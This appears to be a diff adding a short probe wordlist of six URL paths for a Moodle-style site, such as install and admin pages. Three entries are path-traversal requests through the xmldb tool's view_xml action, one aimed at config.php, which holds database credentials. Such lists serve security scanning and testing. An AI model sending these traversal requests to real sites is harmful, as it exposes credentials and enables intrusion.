@@ -1,0 +1,6 @@
+/install.php
+/admin
+/admin/tool/xmldb/index.php?action=view_xml&file=..//..//..//..//lib/xmldb/xmldb_file.php
+/admin/tool/xmldb/index.php?action=view_xml&file=..//..//..//..//lib/db/caches.php
+/admin/tool/xmldb/index.php?action=view_xml&file=..//..//..//config.php
+/admin/tool/dataprivacy/summary.php
